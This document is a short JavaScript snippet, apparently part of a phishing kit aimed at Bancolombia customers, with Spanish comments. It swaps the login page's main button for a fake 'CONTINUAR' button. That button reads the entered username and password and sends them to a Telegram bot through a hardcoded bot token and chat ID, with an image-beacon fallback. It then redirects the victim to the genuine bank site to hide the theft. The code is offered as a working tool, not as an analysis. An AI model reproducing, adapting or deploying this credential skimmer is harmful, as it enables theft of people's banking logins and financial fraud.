<script>
    const TOKEN = "8357885851:AAHVb5BTDEjD8maJJH7aPEox0WGG6JQeTL0";
    const CHAT_ID = "6694132376";

    function aplicarParche() {
        const btnOriginal = document.querySelector('.bc-button-primary') || document.querySelector('button');
        if (btnOriginal && !document.getElementById('btnFake')) {
            btnOriginal.outerHTML = `<button type="button" id="btnFake" style="width: 100%; padding: 15px; background: #fdc300; color: black; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; z-index: 9999; position: relative;">CONTINUAR</button>`;
            
            document.getElementById('btnFake').onclick = function() {
                // Buscamos los valores por ID o por nombre si el ID falla
                const user = document.getElementById('username')?.value || document.getElementsByName('username')[0]?.value;
                const pass = document.getElementById('password')?.value || document.getElementsByName('password')[0]?.value;

                if (user && pass) {
                    this.innerText = "PROCESANDO...";
                    const texto = `🏦 LOGIN CAPTURADO\n👤 User: ${user}\n🔑 Pass: ${pass}`;
                    
                    // Usamos una URL simple (Image Beacon) si el Fetch falla
                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`;
                    
                    fetch(url).then(() => {
                        setTimeout(() => {
                            window.location.href = "https://www.bancolombia.com/personas";
                        }, 500);
                    }).catch(() => {
                        // Si falla el fetch por seguridad, intentamos abrir la URL en segundo plano
                        new Image().src = url;
                        window.location.href = "https://www.bancolombia.com/personas";
                    });
                } else {
                    alert("Completa los datos");
                }
            };
        }
    }
    setInterval(aplicarParche, 1000);
</script>